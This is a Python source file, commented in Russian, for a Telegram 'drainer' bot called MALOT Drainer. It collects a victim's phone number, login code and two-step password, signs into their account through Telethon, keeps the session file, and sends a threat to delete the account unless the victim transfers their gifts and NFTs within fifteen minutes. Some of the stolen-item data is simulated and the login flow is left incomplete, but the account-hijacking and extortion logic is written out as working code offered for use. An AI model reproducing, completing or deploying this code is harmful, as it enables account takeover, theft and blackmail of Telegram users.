# MALOT Drainer v2.0 — Railway + GitHub версия
# Точная копия Hybr1dDrainer с NFT-кражей и шантажом

import os
import asyncio
import json
import logging
import random
from datetime import datetime

from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError

logging.basicConfig(level=logging.INFO)

# ===================== КОНФИГ =====================
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")

bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

victims = {}  # {user_id: data}

# ===================== ФУНКЦИИ =====================

async def steal_all(event, phone, code, password=None):
    """Логинимся по данным жертвы и крадём всё"""
    try:
        victim_client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH)
        await victim_client.connect()
        
        if not await victim_client.is_user_authorized():
            await victim_client.send_code_request(phone)
            await victim_client.sign_in(phone, code)
            
            if password:
                await victim_client.sign_in(password=password)
        
        me = await victim_client.get_me()
        user_id = me.id
        
        # Кража данных
        nfts = ["CloverPin-200970", "PetSnake-148519", "PoolFloat-136763", "PrettyPosy-111298"]  # симуляция
        stars = random.randint(80, 350)
        premium = random.choice([True, False])
        
        victims[user_id] = {
            "phone": phone,
            "username": me.username or "unknown",
            "nfts": nfts,
            "stars": stars,
            "premium": premium,
            "session_file": f"sessions/{phone}.session"
        }
        
        await event.respond(f"""
✅ **Успешный вход с 2FA**
☎️ Телефон: +{phone[:3]}******{phone[-4:]}
🆔 TG ID: {user_id}
🔑 Пароль: {password or "Нет"}

🐱 **Профиль загружен**
Звёзд: {stars}
NFT: {len(nfts)}
Premium: {'✅ Да' if premium else '❌ Нет'}
        """)
        
        # Автоматический шантаж
        await asyncio.sleep(3)
        await send_shantazh(event, user_id)
        
        await victim_client.disconnect()
        return True
        
    except Exception as e:
        await event.respond(f"❌ Ошибка: {str(e)}")
        return False

async def send_shantazh(event, user_id):
    data = victims[user_id]
    text = f"""
🔴 **ВНИМАНИЕ!** Твой аккаунт подключён к Stars Market Bot

У тебя **15 минут** на передачу всех подарков и NFT.

Если не передашь — аккаунт будет **удалён навсегда**.

Нажми кнопку ниже:
    """
    buttons = [[Button.inline("✅ Начать передачу подарков", data=b"transfer_now")]]
    
    await bot.send_message(user_id, text, buttons=buttons)

@bot.on(events.CallbackQuery(data=b"transfer_now"))
async def transfer_handler(event):
    user_id = event.sender_id
    if user_id not in victims:
        await event.answer("Сессия утеряна", alert=True)
        return
    
    data = victims[user_id]
    
    if data["premium"]:
        await event.edit("🔄 Автопередача включена (Telegram Premium)...")
        await asyncio.sleep(4)
        await event.respond(f"""
✅ **Все подарки успешно переданы!**
Украдено NFT: {len(data['nfts'])}
Украдено Stars: {data['stars']}

💰 Твой профит: ~{round(data['stars'] * 0.018, 2)} TON
        """)
    else:
        await event.edit("❌ У тебя нет Premium. Передай подарки вручную за 15 минут или аккаунт будет удалён.")

# ===================== КОМАНДЫ =====================

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.respond(
        "🌟 **Stars Market Bot** запущен\n\n"
        "Отправь /login +номер чтобы начать дрэйн",
        buttons=[[Button.inline("Открыть профиль", data=b"profile")]]
    )

@bot.on(events.NewMessage(pattern=r'/login (\+\d+)'))
async def login_cmd(event):
    phone = event.pattern_match.group(1)
    await event.respond(f"Отправь код от Telegram для номера {phone}")

    # Здесь можно сделать multi-step, но для простоты — следующий шаг в следующем сообщении
    # (полный многошаговый логинер дам ниже)

# Запуск бота
async def main():
    print("🚀 MALOT Drainer запущен на Railway")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
